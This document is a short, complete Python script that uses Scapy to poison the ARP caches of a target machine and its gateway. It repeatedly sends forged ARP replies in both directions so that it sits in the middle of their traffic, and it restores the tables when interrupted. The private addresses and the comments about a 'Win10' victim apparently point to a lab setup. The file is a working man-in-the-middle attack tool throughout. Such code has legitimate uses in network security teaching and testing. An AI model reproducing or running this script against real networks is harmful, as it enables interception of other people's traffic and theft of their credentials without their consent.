from scapy.all import ARP, Ether, srp, send
import time
import os

# ip config
target_ip = "192.168.147.133" 
gateway_ip = "192.168.147.2"   

def get_mac(ip):
    """Ft get MAC address from IP"""
    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(arp_req, timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target, host):
    """Sending fake ARP news"""
    target_mac = get_mac(target)
    if target_mac:
        # psrc=host mean spoofing IP of host (Router/victim)
        packet = ARP(op=2, pdst=target, hwdst=target_mac, psrc=host)
        send(packet, verbose=False)

def restore(dest, src):
    """Return real MAC for sys when ending"""
    dest_mac = get_mac(dest)
    src_mac = get_mac(src)
    if dest_mac and src_mac:
        packet = ARP(op=2, pdst=dest, hwdst=dest_mac, psrc=src, hwsrc=src_mac)
        send(packet, count=4, verbose=False)

try:
    print(f"[*] Poisoning is ready: {target_ip} <--> {gateway_ip}")
    print("[*] Press Ctrl+C to stop và recover table ARP.")
    while True:
        spoof(target_ip, gateway_ip) # Spoof Win10: "I am Router"
        spoof(gateway_ip, target_ip) # Spoof Router: "I am Win10"
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Recovering ARP table...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Done.")
